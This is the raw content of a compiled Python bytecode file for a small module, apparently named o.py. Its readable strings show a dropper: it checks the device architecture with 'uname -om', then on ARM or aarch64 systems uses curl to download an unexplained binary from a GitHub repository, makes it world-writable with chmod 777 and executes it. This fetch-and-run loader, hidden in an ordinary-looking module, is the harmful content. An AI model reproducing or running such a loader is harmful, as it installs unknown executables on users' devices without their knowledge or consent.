o
    ���b�  �                   @   s�   d dl Z d dlZd dlZejddd�Zdee�v r/e j�d�s*e �d� e �d� ne �d	� d
ee�v rPe j�d�sKe �d� e �d� e �d� ne �d� e	d� e j�
�  dS )�    Nz	uname -omT)�shellZaarch64Zt64zFcurl -L https://github.com/tcoder99/files/blob/main/t64?raw=true > t64zchmod 777 t64z./t64ZarmZt32zFcurl -L https://github.com/tcoder99/files/blob/main/t32?raw=true > t32zchmod 777 t32z./t32z./h32z(
  Unknown device, aarch or os found ...)�os�sys�
subprocessZcheck_outputZ
current_os�str�path�isfile�system�print�exit� r   r   �o.py�<module>   s"   




